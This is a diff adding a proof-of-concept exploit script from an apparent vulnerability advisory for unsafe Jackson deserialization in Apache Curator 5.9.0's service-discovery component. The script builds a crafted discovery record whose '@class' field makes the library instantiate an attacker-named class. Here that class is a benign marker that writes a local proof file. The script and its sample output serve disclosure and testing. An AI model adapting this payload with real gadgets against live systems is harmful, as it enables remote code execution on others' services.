@@ -1,0 +1,257 @@
+#!/usr/bin/env python
+#
+#
+# Apache Curator 5.9.0 Java Deserialization
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://curator.apache.org
+# Affected version: 5.9.0
+#
+# Summary: Apache Curator is a Java/JVM client library for Apache ZooKeeper,
+# a distributed coordination service. It includes a high level API framework
+# and utilities to make using Apache ZooKeeper much easier and more reliable.
+# It also includes recipes for common use cases and extensions such as service
+# discovery and a Java 8 asynchronous DSL.
+#
+# Desc: Apache Curator suffers from an unsafe deserialization vulnerability
+# in its service-discovery component. The discovery payload is deserialized
+# with Jackson polymorphic typing configured as Id.CLASS, which lets the serialized
+# data name the Java class to instantiate, so an attacker who can publish a
+# crafted discovery record (via ZooKeeper write access or rogue-service registration)
+# can drive gadget-based deserialization on a consumer that reads it, resulting
+# in remote code execution where a suitable gadget is present on that consumer's
+# classpath.
+#
+# =============================================================
+# > python curator_murator.py --keep
+# [*] Step 1/4: fetching the real vendor jars from Maven Central
+#     [>] curator-x-discovery-5.9.0.jar
+#     [>] curator-client-5.9.0.jar
+#     [>] jackson-databind-2.18.1.jar
+#     [>] jackson-core-2.18.1.jar
+#     [>] jackson-annotations-2.18.1.jar
+#     [>] slf4j-api-1.7.36.jar
+# [*] Step 2/4: writing Java sources
+# [*] Step 3/4: compiling
+# [*] Step 4/4: running against the real JsonInstanceSerializer
+# --------------------------------------------------------------------
+# [*] Simulated poisoned ZooKeeper discovery znode:
+#     {"name":"evil-svc","id":"evil-1","address":"10.0.0.1","port":1234,"sslPort":0,"payload":{"@class":"Marker","cmd":"id;whoami"},"registrationTimeUTC":0,"serviceType":"DYNAMIC","uriSpec":null,"enabled":true}
+# [*] Feeding it to the REAL curator-x-discovery JsonInstanceSerializer.deserialize()...
+# >>> Marker() CONSTRUCTED from attacker-controlled @class field
+# >>> setCmd("id;whoami") invoked by Jackson with attacker data
+# [*] deserialize() returned; payload class = Marker
+# --------------------------------------------------------------------
+#
+# [+] TRIGGERED: attacker class ran during curator-x-discovery deserialization.
+#     Proof file PWNED_MARKER.txt:
+#       >>> code ran during curator deserialize (constructor) @ Tue Oct 06 18:13:52 CEST 2026
+#       >>> code ran during curator deserialize (setter cmd=id;whoami) @ Tue Oct 06 18:13:52 CEST 2026
+#
+#     (Marker is a benign demonstrator. Full RCE needs a real gadget on the
+#      discovery consumer's classpath + the ability to write the ZK znode.)
+#
+# [*] work dir kept: C:\Users\curator_discovery_deser\work
+#
+# =============================================================
+#
+# Tested on: Microsoft Windows 10 (x86_64)
+#            Eclipse Temurin OpenJDK 21.0.6 (LTS)
+#            Jackson 2.18.1
+#            SLF4J 1.7.36
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6009
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6009
+#
+#
+# 13.08.2026
+#
+
+import urllib.request    # ...................................... #
+import subprocess    # .............................................. #
+import argparse    # .................................................. #
+import shutil    # ...................................................... #
+import sys    # ............................................................ #
+import os    # .............................................................. #
+
+r"""
+Apache Curator (curator-x-discovery) 5.9.0 - unsafe Jackson @JsonTypeInfo(Id.CLASS)
+deserialization of service-discovery payloads.
+
+What it does:
+  1. Downloads the REAL vendor jars from Maven Central (curator-x-discovery 5.9.0 +
+     Jackson 2.18.1 that Curator pins, plus guava/slf4j for class loading).
+  2. Emits a benign demonstrator class Marker.java and a driver.
+  3. Compiles them and runs the driver, which feeds an attacker-controlled
+     "poisoned ZooKeeper znode" (a ServiceInstance JSON whose payload carries
+     "@class":"Marker") to the REAL org.apache.curator.x.discovery.details
+     .JsonInstanceSerializer.deserialize(byte[]).
+  4. Jackson honors the @class on ServiceInstance.getPayload()
+     (@JsonTypeInfo(use=Id.CLASS, defaultImpl=Object.class)) and instantiates the
+     attacker-named class + drives its setter BEFORE the library's payloadClass.cast()
+     type check. Marker proves this by writing PWNED_MARKER.txt from its constructor
+     and setter. The script then verifies that file exists.
+
+Usage:
+    python3 curator_murator.py            # fetch, build, run
+    python3 curator_murator.py --keep     # keep the work dir and jars afterwards
+"""
+
+CURATOR_VERSION = "5.9.0"
+JACKSON_VERSION = "2.18.1"
+SLF4J_VERSION   = "1.7.36"
+CENTRAL = "https://repo1.maven.org/maven2"
+
+JARS = {
+    f"curator-x-discovery-{CURATOR_VERSION}.jar":
+        f"{CENTRAL}/org/apache/curator/curator-x-discovery/{CURATOR_VERSION}/curator-x-discovery-{CURATOR_VERSION}.jar",
+    f"curator-client-{CURATOR_VERSION}.jar":
+        f"{CENTRAL}/org/apache/curator/curator-client/{CURATOR_VERSION}/curator-client-{CURATOR_VERSION}.jar",
+    f"jackson-databind-{JACKSON_VERSION}.jar":
+        f"{CENTRAL}/com/fasterxml/jackson/core/jackson-databind/{JACKSON_VERSION}/jackson-databind-{JACKSON_VERSION}.jar",
+    f"jackson-core-{JACKSON_VERSION}.jar":
+        f"{CENTRAL}/com/fasterxml/jackson/core/jackson-core/{JACKSON_VERSION}/jackson-core-{JACKSON_VERSION}.jar",
+    f"jackson-annotations-{JACKSON_VERSION}.jar":
+        f"{CENTRAL}/com/fasterxml/jackson/core/jackson-annotations/{JACKSON_VERSION}/jackson-annotations-{JACKSON_VERSION}.jar",
+    f"slf4j-api-{SLF4J_VERSION}.jar":
+        f"{CENTRAL}/org/slf4j/slf4j-api/{SLF4J_VERSION}/slf4j-api-{SLF4J_VERSION}.jar",
+}
+
+MARKER_JAVA = r"""
+import java.nio.file.*;
+import java.nio.charset.StandardCharsets;
+
+public class Marker {
+    public Marker() {
+        System.out.println(">>> Marker() CONSTRUCTED from attacker-controlled @class field");
+        touch("constructor");
+    }
+    public void setCmd(String c) {
+        System.out.println(">>> setCmd(\"" + c + "\") invoked by Jackson with attacker data");
+        touch("setter cmd=" + c);
+    }
+    private static void touch(String where) {
+        try {
+            Files.write(Paths.get("PWNED_MARKER.txt"),
+                (">>> code ran during curator deserialize (" + where + ") @ "
+                 + new java.util.Date() + "\n").getBytes(StandardCharsets.UTF_8),
+                StandardOpenOption.CREATE, StandardOpenOption.APPEND);
+        } catch (Exception e) { /* ignore */ }
+    }
+}
+"""
+
+DRIVER_JAVA = r"""
+import org.apache.curator.x.discovery.ServiceInstance;
+import org.apache.curator.x.discovery.details.JsonInstanceSerializer;
+
+public class CuratorDiscoveryPoc {
+    public static void main(String[] args) throws Exception {
+        String evil =
+            "{\"name\":\"evil-svc\",\"id\":\"evil-1\",\"address\":\"10.0.0.1\"," +
+            "\"port\":1234,\"sslPort\":0," +
+            "\"payload\":{\"@class\":\"Marker\",\"cmd\":\"id;whoami\"}," +
+            "\"registrationTimeUTC\":0,\"serviceType\":\"DYNAMIC\",\"uriSpec\":null,\"enabled\":true}";
+        byte[] znodeBytes = evil.getBytes("UTF-8");
+
+        System.out.println("[*] Simulated poisoned ZooKeeper discovery znode:");
+        System.out.println("    " + evil);
+        System.out.println("[*] Feeding it to the REAL curator-x-discovery JsonInstanceSerializer.deserialize()...");
+
+        JsonInstanceSerializer<Object> ser = new JsonInstanceSerializer<Object>(Object.class);
+        try {
+            ServiceInstance<Object> si = ser.deserialize(znodeBytes);
+            Object p = si.getPayload();
+            System.out.println("[*] deserialize() returned; payload class = "
+                + (p == null ? "null" : p.getClass().getName()));
+        } catch (Throwable t) {
+            System.out.println("[*] deserialize() threw AFTER payload construction (expected for some payloads): " + t);
+        }
+    }
+}
+"""
+
+def have(tool):
+    return shutil.which(tool) is not None
+
+def download(url, dest):
+    if os.path.exists(dest) and os.path.getsize(dest) > 0:
+        print(f"    [=] cached {os.path.basename(dest)}")
+        return
+    print(f"    [>] {os.path.basename(dest)}")
+    req = urllib.request.Request(url, headers={"User-Agent": "curator-murator/6.10"})
+    with urllib.request.urlopen(req, timeout=60) as r, open(dest, "wb") as f:
+        shutil.copyfileobj(r, f)
+    if os.path.getsize(dest) == 0:
+        raise RuntimeError(f"empty download: {url}")
+
+def main():
+    ap = argparse.ArgumentParser(description="Automated Apache Curator discovery deser PoC")
+    ap.add_argument("--work", default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "work"),
+                    help="work directory (default: ./work next to this script)")
+    ap.add_argument("--keep", action="store_true", help="keep the work dir afterwards")
+    a = ap.parse_args()
+
+    for t in ("java", "javac"):
+        if not have(t):
+            sys.exit(f"[!] '{t}' not found on PATH. Install a JDK (e.g. Temurin) and retry.")
+
+    work = a.work
+    lib = os.path.join(work, "lib")
+    os.makedirs(lib, exist_ok=True)
+
+    print("[*] Step 1/4: fetching the real vendor jars from Maven Central")
+    for name, url in JARS.items():
+        download(url, os.path.join(lib, name))
+
+    print("[*] Step 2/4: writing Java sources")
+    with open(os.path.join(work, "Marker.java"), "w", encoding="utf-8") as f:
+        f.write(MARKER_JAVA)
+    with open(os.path.join(work, "CuratorDiscoveryPoc.java"), "w", encoding="utf-8") as f:
+        f.write(DRIVER_JAVA)
+
+    jars = [os.path.join("lib", n) for n in JARS]
+    cp = os.pathsep.join(jars + ["."])
+    marker = os.path.join(work, "PWNED_MARKER.txt")
+    if os.path.exists(marker):
+        os.remove(marker)
+
+    print("[*] Step 3/4: compiling")
+    rc = subprocess.run(["javac", "-cp", cp, "Marker.java", "CuratorDiscoveryPoc.java"],
+                        cwd=work)
+    if rc.returncode != 0:
+        sys.exit("[!] compilation failed")
+
+    print("[*] Step 4/4: running against the real JsonInstanceSerializer\n" + "-" * 68)
+    subprocess.run(["java", "-cp", cp, "CuratorDiscoveryPoc"], cwd=work)
+    print("-" * 68)
+
+    if os.path.exists(marker) and os.path.getsize(marker) > 0:
+        print("\n[+] TRIGGERED: attacker class ran during curator-x-discovery deserialization.")
+        print("    Proof file PWNED_MARKER.txt:")
+        with open(marker, encoding="utf-8") as f:
+            for line in f:
+                print("      " + line.rstrip())
+        print("\n    (Marker is a benign demonstrator. Full RCE needs a real gadget on the")
+        print("     discovery consumer's classpath + the ability to write the ZK znode.)")
+        result = 0
+    else:
+        print("\n[-] No proof file produced - the payload did not instantiate the attacker class.")
+        result = 1
+
+    if a.keep:
+        print(f"\n[*] work dir kept: {work}")
+    else:
+        shutil.rmtree(work, ignore_errors=True)
+        print("\n[*] cleaned up work dir (use --keep to retain jars + sources)")
+    sys.exit(result)
+
+
+if __name__ == "__main__":
+    main()
